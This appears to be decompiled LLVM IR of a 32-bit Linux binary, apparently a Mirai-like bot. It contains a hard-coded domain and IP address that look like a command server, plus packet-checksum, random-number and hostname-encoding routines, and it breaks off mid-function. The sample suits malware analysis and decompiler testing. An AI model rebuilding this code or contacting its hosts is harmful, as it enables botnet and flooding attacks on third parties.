source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80542d0.2 = global i32 0
@global_var_80542e8.3 = local_unnamed_addr global i32* @global_var_80542d0.2
@global_var_8054390.5 = local_unnamed_addr global i32 0
@global_var_805439c.6 = local_unnamed_addr global i32 0
@global_var_8054394.7 = local_unnamed_addr global i32 0
@global_var_8054398.8 = local_unnamed_addr global i32 0
@global_var_80543f0.9 = local_unnamed_addr global i32 0
@global_var_80543ca.10 = local_unnamed_addr global i32 0
@global_var_80543d0.11 = local_unnamed_addr global i32 0
@global_var_80543c0.12 = global i32 0
@global_var_80543d8.14 = local_unnamed_addr global i32 0
@global_var_80543e4.15 = local_unnamed_addr global i32 0
@global_var_80543d4.16 = global i32 0
@global_var_805443c.17 = local_unnamed_addr global i32 0
@global_var_80543c4.18 = local_unnamed_addr global i32 0
@global_var_805441c.19 = local_unnamed_addr global i32 0
@global_var_80543cc.20 = local_unnamed_addr global i32 0
@global_var_8054438.21 = local_unnamed_addr global i32 0
@global_var_80543a0.23 = local_unnamed_addr global i32 0
@global_var_80543e8.24 = local_unnamed_addr global i32 0
@global_var_8052baf.25 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052b22.26 = constant [22 x i8] c"indiatechsupport.club\00"
@global_var_8052b38.27 = constant [15 x i8] c"188.166.125.59\00"
@global_var_8054460.28 = global i32 0
@global_var_8054414.30 = global i32 0
@global_var_8054560.31 = global i32 0
@global_var_8054300.32 = global i32 0
@global_var_805460c.34 = global i32 0
@global_var_8054610.35 = local_unnamed_addr global i32 0
@global_var_8054614.36 = global i32 0
@global_var_8054620.37 = local_unnamed_addr global i32 0
@global_var_8054914.38 = global i32 0
@global_var_805493c.39 = local_unnamed_addr global i32 0
@global_var_805492c.40 = local_unnamed_addr global i32 0
@global_var_8054930.41 = local_unnamed_addr global i32 0
@global_var_8054934.42 = local_unnamed_addr global i32 0
@global_var_8054938.43 = local_unnamed_addr global i32 0
@global_var_8054944.44 = local_unnamed_addr global i32 0
@global_var_8054950.45 = local_unnamed_addr global i32 0
@global_var_8054948.46 = local_unnamed_addr global i32 0
@global_var_8054954.47 = local_unnamed_addr global i32 0
@global_var_8054928.48 = local_unnamed_addr global i32 0
@global_var_8054924.50 = local_unnamed_addr global i32 0
@global_var_805494c.51 = local_unnamed_addr global i32 0
@global_var_805461c.52 = local_unnamed_addr global i32 0
@global_var_8054318.53 = global i32 0
@global_var_8054330.55 = global i32 0
@global_var_80543f8.56 = local_unnamed_addr global i32 0
@global_var_80542c4.58 = global i32 -1
@global_var_80520c3.59 = constant i32 -294069
@global_var_8054408.60 = local_unnamed_addr global i32 0
@global_var_805440c.61 = local_unnamed_addr global i32 0
@global_var_8052fb0.62 = constant [10 x i8] c"/dev/null\00"
@global_var_8054404.64 = local_unnamed_addr global i32 0
@global_var_80543fc.65 = local_unnamed_addr global i32 0
@global_var_8054400.66 = local_unnamed_addr global i32 0
@global_var_80530c0.68 = constant i32 33554944
@global_var_80522a9.69 = constant i32 1928542531
@global_var_80522cd.70 = constant i32 1928542531
@global_var_8054418.71 = local_unnamed_addr global i32 0
@global_var_805434c.72 = local_unnamed_addr global i32* @global_var_80530c0.68
@global_var_8054958.73 = local_unnamed_addr global i32 0
@global_var_805495c.74 = local_unnamed_addr global i32 0
@global_var_8054360.1 = local_unnamed_addr global i8 0
@global_var_80543d6.13 = local_unnamed_addr global i16 0
@global_var_80543ec.22 = local_unnamed_addr global i16 0
@global_var_80542fc.29 = local_unnamed_addr global i16 -1105
@global_var_80545e0.33 = global i8 0
@global_var_8054940.49 = local_unnamed_addr global i8 0
@global_var_80543f4.54 = local_unnamed_addr global i8 0
@global_var_8054410.63 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 49723
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052ae0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8054360.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80542e8.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80542e8.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80542e8.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8054360.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80542e8.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8054360.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134558400)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_805215f(i32 134533040, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134556422, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a19 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a19
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134556422

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d700(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d700:
  %v0_804d700 = load i32, i32* @global_var_8054390.5, align 16
  %v0_804d708 = load i32, i32* @global_var_805439c.6, align 4
  %v2_804d70e = mul i32 %v0_804d700, 2048
  %v2_804d713 = udiv i32 %v0_804d708, 524288
  store i32 %v2_804d713, i32* @ecx, align 4
  %v2_804d716 = xor i32 %v2_804d70e, %v0_804d700
  %v0_804d718 = load i32, i32* @global_var_8054394.7, align 4
  store i32 %v0_804d718, i32* @global_var_8054390.5, align 16
  %v0_804d722 = load i32, i32* @global_var_8054398.8, align 8
  store i32 %v0_804d722, i32* @global_var_8054394.7, align 4
  store i32 %v0_804d708, i32* @global_var_8054398.8, align 8
  %v2_804d734 = xor i32 %v2_804d713, %v0_804d708
  %v2_804d736 = udiv i32 %v2_804d716, 256
  %v2_804d739 = xor i32 %v2_804d736, %v2_804d716
  %v2_804d73b = xor i32 %v2_804d739, %v2_804d734
  store i32 %v2_804d73b, i32* @global_var_805439c.6, align 4
  ret i32 %v2_804d73b

; uselistorder directives
  uselistorder i32 %v2_804d716, { 1, 0 }
  uselistorder i32 %v2_804d713, { 1, 0 }
  uselistorder i32 %v0_804d708, { 1, 2, 0 }
  uselistorder i32 %v0_804d700, { 1, 0 }
}

define i32 @function_804d930() local_unnamed_addr {
dec_label_pc_804d930:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804d930 = load i32, i32* @ebx, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v1_804d938 = icmp eq i32 %tmp, 0
  br i1 %v1_804d938, label %dec_label_pc_804d930.dec_label_pc_804d960_crit_edge, label %dec_label_pc_804d93c

dec_label_pc_804d930.dec_label_pc_804d960_crit_edge: ; preds = %dec_label_pc_804d930
  br label %dec_label_pc_804d960

dec_label_pc_804d93c:                             ; preds = %dec_label_pc_804d930
  %v1_804d93c = add i32 %tmp, 4
  %v2_804d93c = inttoptr i32 %v1_804d93c to i32*
  %v3_804d93c = load i32, i32* %v2_804d93c, align 4
  %v1_804d93f = icmp eq i32 %v3_804d93c, 0
  br i1 %v1_804d93f, label %dec_label_pc_804d94f, label %dec_label_pc_804d943

dec_label_pc_804d943:                             ; preds = %dec_label_pc_804d93c
  %v1_804d947 = call i32 @function_8051983(i32 %v3_804d93c)
  br label %dec_label_pc_804d94f

dec_label_pc_804d94f:                             ; preds = %dec_label_pc_804d93c, %dec_label_pc_804d943
  store i32 %v0_804d930, i32* @ebx, align 4
  %v1_804d956 = call i32 @function_8051983(i32 %tmp)
  %v2_804d960.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804d960

dec_label_pc_804d960:                             ; preds = %dec_label_pc_804d930.dec_label_pc_804d960_crit_edge, %dec_label_pc_804d94f
  %v2_804d960 = phi i32 [ %tmp12, %dec_label_pc_804d930.dec_label_pc_804d960_crit_edge ], [ %v2_804d960.pre, %dec_label_pc_804d94f ]
  store i32 %v0_804d930, i32* @ebx, align 4
  ret i32 %v2_804d960

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804d960, { 1, 0 }
  uselistorder label %dec_label_pc_804d94f, { 1, 0 }
}

define i32 @function_804d970() local_unnamed_addr {
dec_label_pc_804d970:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp89 = call i8* @__decompiler_undefined_function_5()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804d97c = ptrtoint i8* %tmp89 to i32
  store i32 %v4_804d97c, i32* @ebx, align 4
  %v4_804d987 = call i32 @function_8051332(i64 1, i32 8)
  %v2_804d990 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804d990, i32* %eax.global-to-local, align 4
  %tmp101 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804d99b = load i32, i32* @ebx, align 4
  %v4_804d99b = inttoptr i32 %v0_804d99b to i8*
  %v3_804d99e = call i32 @function_804fd30(i8* %v4_804d99b)
  %v2_804d9a3 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804d9a3, i32* %ecx.global-to-local, align 4
  %v1_804d9aa = add i32 %v3_804d99e, 1
  store i32 %v1_804d9aa, i32* %eax.global-to-local, align 4
  store i32 %v2_804d990, i32* %edi.global-to-local, align 4
  %tmp102 = icmp slt i32 %v1_804d9aa, 1
  br i1 %tmp102, label %dec_label_pc_804d9d3, label %dec_label_pc_804d9b6

dec_label_pc_804d9b6:                             ; preds = %dec_label_pc_804d970, %dec_label_pc_804d9cf
  %v2_804d9c9 = phi i32 [ %v2_804d9c931, %dec_label_pc_804d9cf ], [ %v2_804d9a3, %dec_label_pc_804d970 ]
  %v0_804d9b6 = load i32, i32* @ebx, align 4
  %v1_804d9b6 = inttoptr i32 %v0_804d9b6 to i8*
  %v2_804d9b6 = load i8, i8* %v1_804d9b6, align 1
  %v3_804d9b6 = zext i8 %v2_804d9b6 to i32
  %v4_804d9b6 = load i32, i32* @edx, align 4
  %v5_804d9b6 = and i32 %v4_804d9b6, -256
  %v6_804d9b6 = or i32 %v5_804d9b6, %v3_804d9b6
  store i32 %v6_804d9b6, i32* @edx, align 4
  switch i8 %v2_804d9b6, label %dec_label_pc_804d9c9 [
    i8 46, label %dec_label_pc_804dbf0
    i8 0, label %dec_label_pc_804dbf0
  ]

dec_label_pc_804d9c9:                             ; preds = %dec_label_pc_804d9b6
  %v3_804d9c9 = inttoptr i32 %v2_804d9c9 to i8*
  store i8 %v2_804d9b6, i8* %v3_804d9c9, align 1
  %v0_804d9cb = load i32, i32* @esi, align 4
  %v1_804d9cb = add i32 %v0_804d9cb, 1
  store i32 %v1_804d9cb, i32* @esi, align 4
  %v0_804d9cc = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d9cc = add i32 %v0_804d9cc, 1
  store i32 %v1_804d9cc, i32* %ecx.global-to-local, align 4
  %v0_804d9cd = load i32, i32* @ebx, align 4
  %v1_804d9cd = add i32 %v0_804d9cd, 1
  store i32 %v1_804d9cd, i32* @ebx, align 4
  %v0_804d9ce = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9ce = add i32 %v0_804d9ce, -1
  store i32 %v1_804d9ce, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d9cf

dec_label_pc_804d9cf:                             ; preds = %dec_label_pc_804dbf0, %dec_label_pc_804d9c9
  %v0_804d9cf = phi i32 [ %v1_804dbf9, %dec_label_pc_804dbf0 ], [ %v1_804d9ce, %dec_label_pc_804d9c9 ]
